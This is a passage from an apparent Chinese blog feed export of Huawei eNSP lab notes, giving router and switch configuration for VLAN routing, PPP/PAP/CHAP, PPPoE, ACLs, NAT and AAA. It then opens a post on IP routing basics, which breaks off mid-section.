VLAN间路由配置"></a>6.2 VLAN间路由配置</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f6c0375132923bf8dd8d87.png"></p><h4 id="6-2-1-实验环境准备"><a href="#6-2-1-实验环境准备" class="headerlink" title="6.2.1 实验环境准备"></a>6.2.1 实验环境准备</h4><p>设置设备名和对应接口地址</p><p>创建VLAN</p><p>在S1上创建vlan4，8，G0/0/1<del>4 G0/0/3\</del>8</p><p>将S1的G0/0/2设置为Trunk接口并允许vlan4，8通过</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入接口设置trunk<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br>port link-<span class="hljs-built_in">type</span> trunk<br># 允许通过的vlan<br>port trunk allow-pass vlan <span class="hljs-number">4</span> <span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><h4 id="6-2-2-路由实现VLAN间路由"><a href="#6-2-2-路由实现VLAN间路由" class="headerlink" title="6.2.2 路由实现VLAN间路由"></a>6.2.2 路由实现VLAN间路由</h4><p>在R2上的子接口实现VLAN间路由</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入R2的子接口<br>int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br># 设置IP地址<br>ip address <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span> <span class="hljs-number">24</span><br># 配置子接口封装VLAN ID<br>dotlq termination vid <span class="hljs-number">4</span><br># 开启接收子接口的ARP广播功能<br>arp broadcast enable<br># 另一个<span class="hljs-number">1</span>.<span class="hljs-number">3</span>类似<br></code></pre></div></td></tr></table></figure><p>在R1，R3上配置默认路由指向网关</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 配置默认路由<br>ip route-static <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span><br></code></pre></div></td></tr></table></figure><h2 id="实验七-企业广域网配置"><a href="#实验七-企业广域网配置" class="headerlink" title="实验七 企业广域网配置"></a>实验七 企业广域网配置</h2><h3 id="7-1-HDLC和PPP配置"><a href="#7-1-HDLC和PPP配置" class="headerlink" title="7.1 HDLC和PPP配置"></a>7.1 HDLC和PPP配置</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f6c2b55132923bf8e6993d.png"></p><h4 id="7-1-1-实验环境准备"><a href="#7-1-1-实验环境准备" class="headerlink" title="7.1.1 实验环境准备"></a>7.1.1 实验环境准备</h4><p>配置设备名称</p><p>给各个接口配置地址</p><h4 id="7-1-2-串行接口上启用HDLC协议"><a href="#7-1-2-串行接口上启用HDLC协议" class="headerlink" title="7.1.2 串行接口上启用HDLC协议"></a>7.1.2 串行接口上启用HDLC协议</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入接口<br>int S1/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 启用HDLC协议<br>link-protocol hdlc<br></code></pre></div></td></tr></table></figure><h4 id="7-1-3-配置OSPF"><a href="#7-1-3-配置OSPF" class="headerlink" title="7.1.3 配置OSPF"></a>7.1.3 配置OSPF</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 开启OSPF<br>ospf <span class="hljs-number">1</span><br># 增加空间添加网段<br>area <span class="hljs-number">0</span><br>network <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><br><br># 其他类似设置<br># 查看配置结果<br>display ip routing-table<br></code></pre></div></td></tr></table></figure><h4 id="7-1-4-修改串行接口封装类型"><a href="#7-1-4-修改串行接口封装类型" class="headerlink" title="7.1.4 修改串行接口封装类型"></a>7.1.4 修改串行接口封装类型</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入串口<br>int S <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 使用ppp封装<br>link-protocol ppp<br></code></pre></div></td></tr></table></figure><h4 id="7-1-5-在R1和R2启用PAP认证，R2和R3启用CHAP认证功能"><a href="#7-1-5-在R1和R2启用PAP认证，R2和R3启用CHAP认证功能" class="headerlink" title="7.1.5 在R1和R2启用PAP认证，R2和R3启用CHAP认证功能"></a>7.1.5 在R1和R2启用PAP认证，R2和R3启用CHAP认证功能</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># R1作为认证方<br># 进入对应端口<br>int s <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 设置认证模式<br>ppp authentication-<span class="hljs-built_in">mode</span> pap<br># 退出 创建用户<br>aaa<br>loacl-user huawei password cipher <span class="hljs-number">123</span><br># 添加到对应服务中<br>local-user huawei service-<span class="hljs-built_in">type</span> ppp<br># R2配置被认证方<br># 进入对应端口<br>int s <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 配置认证信息<br>ppp pap local-user huawei password cipher <span class="hljs-number">123</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># R3作为CHAP认证方<br># 进入端口<br>int s2/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 配置认证模式<br>ppp authentication-<span class="hljs-built_in">mode</span> chap<br># 其余完全同上 只是将pap改为chap<br></code></pre></div></td></tr></table></figure><h3 id="7-2-配置PPPoE客户端"><a href="#7-2-配置PPPoE客户端" class="headerlink" title="7.2 配置PPPoE客户端"></a>7.2 配置PPPoE客户端</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f6c5ae5132923bf8f1db10.png"></p><h4 id="7-2-1-实验环境准备"><a href="#7-2-1-实验环境准备" class="headerlink" title="7.2.1 实验环境准备"></a>7.2.1 实验环境准备</h4><p>配置各个设备的名称</p><h4 id="7-2-2-配置PPPoE服务器"><a href="#7-2-2-配置PPPoE服务器" class="headerlink" title="7.2.2 配置PPPoE服务器"></a>7.2.2 配置PPPoE服务器</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设置地址池<br>ip pool pool1<br># 设置网络端和网关<br>network <span class="hljs-number">199</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">24</span><br>gateway-list <span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">254</span><br># 设置虚拟模块<br>int Virtual-template <span class="hljs-number">1</span><br># 设置chap认证<br>ppp authentication-<span class="hljs-built_in">mode</span> chap<br># 设置ip地址<br>ip address <span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">254</span> <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span><br># 移除地址池<br>remote address pool pool1<br></code></pre></div></td></tr></table></figure><p>在服务器的G0/0/0接口绑定虚拟模块</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 绑定虚拟模块<br>pppoe-server bind Virtual-template <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>之后的创建账号不在赘述</p><h4 id="7-2-3-配置PPPoE客户端"><a href="#7-2-3-配置PPPoE客户端" class="headerlink" title="7.2.3 配置PPPoE客户端"></a>7.2.3 配置PPPoE客户端</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应的拨号接口视图<br>dialer-rule<br># 创建对应的拨号id<br>dialer-rule <span class="hljs-number">1</span> ip permit<br># 退出 进入对应接口<br>int dialer <span class="hljs-number">1</span><br># 配置用户名<br>dialer user 用户名<br># 将接口置于一个拨号服务组<br>dialer-group <span class="hljs-number">1</span><br># 指定接口使用的Dialer bundle<br>dialer bundle <span class="hljs-number">1</span><br># 设置认证的用户<br>ppp chap user huawei<br>ppp chap password cipher <span class="hljs-number">123</span><br># 设置具体参数<br>dialer timer idle <span class="hljs-number">300</span><br>dialer queue-length <span class="hljs-number">8</span><br>ip address ppp-negotiate<br></code></pre></div></td></tr></table></figure><p>将PPPoE接口绑定出接口</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入接口<br>int 接口<br>pppoe-client dial-bundle-number <span class="hljs-number">1</span><br># 配置缺省路由<br>ip route-static <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> Dialer <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="实验八-IP安全配置"><a href="#实验八-IP安全配置" class="headerlink" title="实验八 IP安全配置"></a>实验八 IP安全配置</h2><h3 id="8-1-配置ACL过滤企业数据"><a href="#8-1-配置ACL过滤企业数据" class="headerlink" title="8.1 配置ACL过滤企业数据"></a>8.1 配置ACL过滤企业数据</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f7df405132923bf8dd9468.png"></p><h4 id="8-1-1-实验环境配置"><a href="#8-1-1-实验环境配置" class="headerlink" title="8.1.1 实验环境配置"></a>8.1.1 实验环境配置</h4><p>设置设备名，并设置交换机vlan ip地址</p><p>并配置路由器对应IP地址和设置交换机的端口为Trunk端口</p><p>配置OSPF使网络互通</p><p>设置交换机缺省静态路由到下一跳的路由器网关</p><h4 id="8-1-2-配置ACL过滤报文"><a href="#8-1-2-配置ACL过滤报文" class="headerlink" title="8.1.2 配置ACL过滤报文"></a>8.1.2 配置ACL过滤报文</h4><p>将S1设置为Telnet服务器</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 开启telnet<br>telnet server enable<br># 进入控制端<br>user-interface vty <span class="hljs-number">0</span> <span class="hljs-number">4</span><br># telnet默认配置<br>protocol inbound all<br># 设置密码<br>authentication-<span class="hljs-built_in">mode</span> password<br><span class="hljs-built_in">set</span> authentication password cipher <span class="hljs-number">123</span><br></code></pre></div></td></tr></table></figure><p>在S2上配置FTP服务器，内容参考5.1</p><p>在R2配置ACL，只允许R1访问Telnet服务器，只允许R3访问FTP服务器</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 创建acl并进入<br>acl <span class="hljs-number">3000</span><br># 设置规则：允许源地址<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">1</span> 目的地址为<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span> 端口为<span class="hljs-number">23</span>的所有TCP报文<br>rule <span class="hljs-number">5</span> permit tcp source <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">1</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination-port eq <span class="hljs-number">23</span><br># 设置规则<br>rule <span class="hljs-number">10</span> permit tcp source <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">3</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>.<span class="hljs-number">254</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination-port eq <span class="hljs-number">20</span> <span class="hljs-number">21</span><br># 设置规则 允许ospf内容通过<br>rule <span class="hljs-number">15</span> permit ospf<br># 设置规则所有地址不可用通过<br>rule <span class="hljs-number">20</span> deny ip source any<br># 进入对应接口设置acl规则<br>int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 在进入时判断<br>traffic-filter inbound acl <span class="hljs-number">3000</span><br></code></pre></div></td></tr></table></figure><h3 id="8-2-NAT配置"><a href="#8-2-NAT配置" class="headerlink" title="8.2 NAT配置"></a>8.2 NAT配置</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f7e3bf5132923bf8f02240.png"></p><h4 id="8-2-1-实验环境配置"><a href="#8-2-1-实验环境配置" class="headerlink" title="8.2.1 实验环境配置"></a>8.2.1 实验环境配置</h4><p>设置设备名，在交换机设置VLANIF和接口类型为trunk，对应接口设置对应IP地址</p><h4 id="8-2-2-配置ACL"><a href="#8-2-2-配置ACL" class="headerlink" title="8.2.2 配置ACL"></a>8.2.2 配置ACL</h4><p>在R1配置高级ACL</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">acl <span class="hljs-number">3000</span><br># 匹配来自<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span> 目的<span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">3</span> 端口<span class="hljs-number">23</span>的tcp报文<br>rule <span class="hljs-number">5</span> permit tcp source <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">254</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination <span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">3</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> destination-port eq <span class="hljs-number">23</span><br># 匹配源地址<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> 目的任何地址的数据<br>rule <span class="hljs-number">10</span> permit ip source <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span> destinaton any<br>rule <span class="hljs-number">15</span> deny ip<br></code></pre></div></td></tr></table></figure><p>R3配置ACL</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应acl<br>acl <span class="hljs-number">2000</span><br># 匹配来自<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>的数据<br>rule permit source <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><br></code></pre></div></td></tr></table></figure><h4 id="8-2-3-配置动态NAT"><a href="#8-2-3-配置动态NAT" class="headerlink" title="8.2.3 配置动态NAT"></a>8.2.3 配置动态NAT</h4><p>首先交换机设置缺省静态路由</p><p>R1设置NAT</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设置动态NAT<br>nat address-group <span class="hljs-number">1</span> <span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">240</span> <span class="hljs-number">119</span>.<span class="hljs-number">84</span>.<span class="hljs-number">111</span>.<span class="hljs-number">243</span><br># 进入接口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 设置出口时对匹配的内容进行NAT转化<br>nat outbound <span class="hljs-number">3000</span> address-group <span class="hljs-number">1</span><br># easy NAT配置<br>nat outbound <span class="hljs-number">3000</span><br></code></pre></div></td></tr></table></figure><p>检查命令 <code>display nat address-group</code>，<code>disaplay acl 3000</code>，<code>display nat session all</code></p><h3 id="8-3-AAA配置"><a href="#8-3-AAA配置" class="headerlink" title="8.3 AAA配置"></a>8.3 AAA配置</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f7e6b95132923bf8fbc03c.png"></p><h4 id="8-3-1-实验环境配置"><a href="#8-3-1-实验环境配置" class="headerlink" title="8.3.1 实验环境配置"></a>8.3.1 实验环境配置</h4><p>设置对应名称和接口地址</p><h4 id="8-3-2-配置AAA功能"><a href="#8-3-2-配置AAA功能" class="headerlink" title="8.3.2 配置AAA功能"></a>8.3.2 配置AAA功能</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入aaa<br>aaa<br># 配置域的认证方案<br>authentication-scheme auth1<br># 配置认证方式 本地认证<br>authentication-<span class="hljs-built_in">mode</span> local<br>quit<br># 配置域的授权方案<br>authorization-scheme auth2<br># 配置授权方式 本地授权<br>authorization-<span class="hljs-built_in">mode</span> local<br>quit<br># 创建域<br>aaa<br>domain huawei<br># 将认证和授权和域绑定起来<br>authentication-scheme auth1<br>authorization-scheme auth2<br>quit<br># 设置用户 并授权给对应服务@后的内容为创建的域<br>local-user user1@huawei password cipher <span class="hljs-number">123</span><br># 添加具体服务的用户<br>local-user user1@huawei service-<span class="hljs-built_in">type</span> telnet<br># 设置用户权限<br>local-user user1@huawei privilege level <span class="hljs-number">0</span><br># 设置认证模式配置<br>user-interface vty <span class="hljs-number">0</span> <span class="hljs-number">4</span><br>authentication-<span class="hljs-built_in">mode</span> aaa<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>eNSP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eNSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IP、静态路由基础,链路状态路由协议-OSPF</title>
    <link href="/2021/07/19/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/IP%E3%80%81%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%9F%BA%E7%A1%80,%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE-OSPF/"/>
    <url>/2021/07/19/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/IP%E3%80%81%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%9F%BA%E7%A1%80,%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE-OSPF/</url>
    
    <content type="html"><![CDATA[<h1 id="IP、静态路由基础-链路状态路由协议-OSPF"><a href="#IP、静态路由基础-链路状态路由协议-OSPF" class="headerlink" title="IP、静态路由基础,链路状态路由协议-OSPF"></a>IP、静态路由基础,链路状态路由协议-OSPF</h1><h2 id="1-IP路由基础"><a href="#1-IP路由基础" class="headerlink" title="1. IP路由基础"></a>1. IP路由基础</h2><h3 id="1-1-自治系统"><a href="#1-1-自治系统" class="headerlink" title="1.1 自治系统"></a>1.1 自治系统</h3><p>一般我们可以把一个企业网络认为是一个自治系统AS (Autonomous System)。根据RFC1030的定义，自治系统是由一个单一实体管辖的网络，这个实体可以是一个互联网服务提供商，或一个大型组织机构</p><p>自治系统内部遵循一个单一且明确的路由策略。最初，自治系统内部只考虑运行单个路由协议；然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><h3 id="1-2-LAN和广播域"><a href="#1-2-LAN和广播域" class="headerlink" title="1.2 LAN和广播域"></a>1.2 LAN和广播域</h3><p>一个AS通常由多个不同的局域网组成</p><p>以企业网络为例，各个部门可以属于不同的局域网，或者各个分支机构和总部也可以属于不同的局域网。局域网内的主机可以通过交换机来实现相互通信</p><p>不同局域网之间的主机要想相互通信，可以通过路由器来实现。路由器工作在网络层，隔离了广播域，并可以作为每个局域网的网关，发现到达目的网络的最优路径，最终实现报文在不同网络间的转发</p><h3 id="1-3-路由选择"><a href="#1-3-路由选择" class="headerlink" title="1.3 路由选择"></a>1.3 路由选择</h3><ol><li>路由器收到数据包后，会根据数据包中的目的IP地址选择一条最优的路径，并将数据包转发到下一个路由器，路径上最后的路由器负责将数据包送交目的主机</li><li>数据包在网络上的传输就好像是体育运动中的接力赛一样，每一个路由器负责将数据包按照最优的路径向下一跳路由器进行转发，通过多个路由器一站一站的接力，最终将数据包通过最优路径转发到目的地。当然有时候由于实施了一些特别的路由策略，数据包通过的路径可能并不一定是最佳的</li><li>路由器能够决定数据报文的转发路径。如果有多条路径可以到达目的地，则路由器会通过进行计算来决定最佳下一跳。计算的原则会随实际使用的路由协议不同而不同</li></ol><h3 id="1-4-IP路由表"><a href="#1-4-IP路由表" class="headerlink" title="1.4 IP路由表"></a>1.4 IP路由表</h3><ul><li><p>路由器转发数据包的关键是路由表</p><p>每个路由器中都保存着一张路由表，表中每条路由表项都指明了数据包要到达某网络或某主机应通过路由器的哪个物理接口发送，以及可到达该路径的哪个下一跳路由器，或者不再经过别的路由器而直接可以到达目的地</p></li><li><p>路由表中包含了下列关键项︰</p><ol><li>目的地址(Destination)：用来标识IP数据包的目的地址或目的网络</li><li>网络掩码(Mask)：在IP编址课程中已经介绍了网络掩码的结构和作用。同样，在路由表中网络掩码也具有重要的意义。IP地址和网络掩码进行“逻辑与”便可得到相应的网段信息。网络掩码的另一个作用还表现在当路由表中有多条目的地址相同的路由信息时，路由器将选择其掩码最长的一项作为匹配项</li><li>输出接口(Interface)：指明IP数据包将从该路由器的哪个接口转发出去</li><li>下一跳IP地址(NextHop)︰指明IP数据包所经由的下一跳路由器的接口地址</li><li>路由表中优先级、度量值等其他的几个字段我们将在以后进行介绍</li></ol></li></ul><h3 id="1-5-路由优先级"><a href="#1-5-路由优先级" class="headerlink" title="1.5 路由优先级"></a>1.5 路由优先级</h3><ol><li><p>路由器可以通过多种不同协议学习到去往同一目的网络的路由，当这些路由都符合最长匹配原则时，必须决定哪个路由优先</p></li><li><p>每个路由协议都有一个协议优先级（取值越小、优先级越高)。当有多个路由信息时，选择最高优先级的路由作为最佳路由</p></li><li><p>如图所示</p><p><img src="https://pic.imgdb.cn/item/60f4edef5132923bf8a45811.png"></p><p>路由器通过两种路由协议学习到了网段10.1.1.0的路由。虽然RIP协议提供了一条看起来更加近的路线，但是由于OSPF具有更高的优先级，因而成为优选路由，并被加入路由表中</p></li></ol><h3 id="1-6-路由度量"><a href="#1-6-路由度量" class="headerlink" title="1.6 路由度量"></a>1.6 路由度量</h3><ul><li>如果路由器无法用优先级来判断最优路由，则使用度量值( metric )来决定需要加入路由表的路由</li><li>一些常用的度量值有︰跳数，带宽，时延，代价，负载，可靠性等<ol><li>跳数是指到达目的地所通过的路由器数目</li><li>带宽是指链路的容量，高速链路开销(度量值)较小。</li><li>metric值越小，路由越优先</li></ol></li></ul><h3 id="1-7-建立路由表"><a href="#1-7-建立路由表" class="headerlink" title="1.7 建立路由表"></a>1.7 建立路由表</h3><ul><li>根据比较“路由优先级”和“路由度量”，设备可以产生最优路径的IP路由表</li><li>根据来源的不同，路由表中的路由通常可分为以下三类∶<ol><li>链路层协议发现的路由(也称为接口路由或直连路由)</li><li>由网络管理员手工配置的静态路由</li><li>动态路由协议发现的路由</li></ol></li></ul><h3 id="1-8-最长匹配原则"><a href="#1-8-最长匹配原则" class="headerlink" title="1.8 最长匹配原则"></a>1.8 